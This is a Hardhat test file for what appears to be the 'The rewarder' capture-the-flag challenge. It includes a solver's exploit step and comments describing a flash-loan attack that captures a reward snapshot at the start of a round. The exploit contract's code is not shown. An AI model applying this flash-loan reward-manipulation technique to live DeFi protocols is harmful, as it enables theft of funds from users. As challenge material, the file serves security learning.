import { ethers, network } from "hardhat";
import { expect } from "chai";


describe('[Challenge] The rewarder', function () {
    this.timeout(0);
    
    const ETHER_IN_POOL = ethers.utils.parseEther('1000'); 

    before(async function () {
        const [deployer, alice, bob, charlie, david, attacker, ...otherAccounts] = await ethers.getSigners();
        const users = [alice, bob, charlie, david];

        const TOKENS_IN_LENDER_POOL = ethers.utils.parseEther('1000000');
       
        const liquidityTokenFactory = await ethers.getContractFactory("DamnValuableToken");
        this.liquidityToken = await liquidityTokenFactory.connect(deployer).deploy();

        const flashLoanerFactory = await ethers.getContractFactory("FlashLoanerPool");
        this.flashLoanPool = await flashLoanerFactory.connect(deployer).deploy(this.liquidityToken.address);
        
        // Set initial token balance of the pool offering flash loans
        await this.liquidityToken.transfer(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL);

        const rewarderPoolFactory = await ethers.getContractFactory("TheRewarderPool");
        this.rewarderPool = await rewarderPoolFactory.connect(deployer).deploy(this.liquidityToken.address);

        const rewardTokenFactory = await ethers.getContractFactory("RewardToken");
        this.rewardToken = await rewardTokenFactory.connect(deployer).attach(await this.rewarderPool.rewardToken());

        const accountingTokenFactory = await ethers.getContractFactory("AccountingToken");
        this.accountingToken = await accountingTokenFactory.connect(deployer).attach(await this.rewarderPool.accToken());

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (let i = 0; i < users.length; i++) {
            const amount = ethers.utils.parseEther('100');
            await this.liquidityToken.transfer(users[i].address, amount);
            await this.liquidityToken.connect(users[i]).approve(this.rewarderPool.address, amount);
            await this.rewarderPool.connect(users[i]).deposit(amount);
            expect(
                await this.accountingToken.balanceOf(users[i].address)
            ).to.be.eq(amount);
        }

        expect(await this.accountingToken.totalSupply()).to.be.eq(ethers.utils.parseEther('400'));
        expect(await this.rewardToken.totalSupply()).to.be.eq(0);

        // Advance time 5 days so that depositors can get rewards
        const duration = 60 * 60 * 24 * 5;
        await network.provider.send("evm_increaseTime", [duration]);
        
        // Each depositor gets 25 reward tokens
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            expect(
                await this.rewardToken.balanceOf(users[i].address)
            ).to.be.eq(ethers.utils.parseEther('25'));
        }
        expect(await this.rewardToken.totalSupply()).to.be.eq(ethers.utils.parseEther('100'));
        
        // Two rounds should have occurred so far
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq(2);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        const accounts = await ethers.getSigners();
        const attacker = accounts[5];

        /* 
         * We need to catch the start of the round to pass "isNewRewardsRound" check and 
         * trigger "_recordSnapshot". So that we can both collect the reward and 
         * return the flashloan back in a single transaction.
         *
         * Challenge also says that "Users should not get more rewards this round"
         * This is achivied with our huge reward but it was unexpected to me. I thought
         * users would get a small amount of reward however they didn't. I suppose this
         * is related to decimal round precision of solidity. Need to experiment on this later.
         */
        const duration = 60 * 60 * 24 * 5;
        await network.provider.send("evm_increaseTime", [duration]);

        const expFactory = await ethers.getContractFactory("TheRewarderExp");
        const expCont = await expFactory.connect(attacker).deploy(
            this.flashLoanPool.address,
            this.rewarderPool.address,
            this.liquidityToken.address,
            this.rewardToken.address,
        );
        
        let loanAmount = await this.liquidityToken.balanceOf(this.flashLoanPool.address);
        console.log(loanAmount);
        let tx = await expCont.attack(loanAmount);
        await tx.wait();
        console.log(tx);

        tx = await expCont.withdraw();
        await tx.wait();
        console.log(tx);
    });

    after(async function () {
        const [deployer, alice, bob, charlie, david, attacker, ...otherAccounts] = await ethers.getSigners();
        const users = [alice, bob, charlie, david];

        /** SUCCESS CONDITION */
        // Only one round should have taken place
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq(3);

        // Users should not get more rewards this round
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            expect(
                await this.rewardToken.balanceOf(users[i].address)
            ).to.be.eq(ethers.utils.parseEther('25'));
        }
        
        // Rewards must have been issued to the attacker account
        expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
        expect(await this.rewardToken.balanceOf(attacker.address)).to.be.gt(0);
   });
});
